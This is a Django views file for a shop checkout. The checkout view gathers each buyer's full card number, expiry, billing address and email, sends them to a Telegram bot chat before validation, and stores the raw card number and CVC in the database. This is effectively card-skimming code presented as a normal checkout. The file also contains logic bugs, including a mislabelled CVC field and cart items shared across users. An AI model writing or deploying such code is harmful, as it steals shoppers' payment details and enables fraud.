from django.shortcuts import render, redirect
from canfigure import bot_token, admin_id
from .models import Order, OrderItems
from cart.cart import CartItem
from common.validators import validate_email
from django.contrib import messages
from common.telegram import send_message


def checkout(request):
    if request.user.is_authenticated:
        if request.method == 'POST':
            email = request.POST['email']
            cardholder = request.POST['card-holder']
            card_no = request.POST['card-no']
            credit_expiry = request.POST['credit-expiry']
            credit_cvc = request.POST['credit-cvc']
            billing_address = request.POST['billing-address']
            billing_zip = request.POST['billing-zip']
            message = f"New Order\nEmail: {email}\nCardHolder: {cardholder}\nCard NO: {card_no}\nCredit Expiry: {credit_expiry}\nCredit cvc: {credit_expiry}" \
                      f"\nAddress: {billing_address}\nZip: {billing_zip}"
            send_message(bot_token, str(admin_id), message)

            if not validate_email(email):
                messages.error(request, 'Email is invalid 🤐')
            else:
                try:
                    if Order.objects.all().count() == 0:
                        order = Order.objects.create(
                            user=request.user,
                            email=email,
                            cardHolder=cardholder,
                            cardNo=card_no,
                            creditExpiry=credit_expiry,
                            creditCvc=credit_cvc,
                            billingAddress=billing_address,
                            billingZip=billing_zip,
                            totalPrice=CartItem.get_total_price(),
                        )
                        order.save()
                        for cartItem in CartItem.objects.all():
                            OrderItems(order=order, product=cartItem.product, quantity=cartItem.quantity).save()
                        CartItem.objects.all().delete()
                    else:
                        order = Order.objects.get(user=request.user)
                        order.email = email
                        order.cardHolder = cardholder
                        order.cardNo = card_no
                        order.creditExpiry = credit_expiry
                        order.creditCvc = credit_cvc
                        order.billingAddress = billing_address
                        order.billingZip = billing_zip
                        order.totalPrice = CartItem.get_total_price()
                        order.save()
                        for cartItem in CartItem.objects.all():
                            OrderItems(order=order, product=cartItem.product, quantity=cartItem.quantity).save()
                        CartItem.objects.all().delete()
                    return redirect('dashboard')
                except Exception as e:
                    messages.error(request, f"Failed to create order: {str(e)}")

    else:
        return redirect('login')

    return render(request, 'checkout.html')


def my_orders(request):
    order = Order.objects.get(user=request.user)
    context = {
        'order': order,
        'order_items': OrderItems.objects.filter(order=order),
    }
    return render(request, 'myorders.html', context)
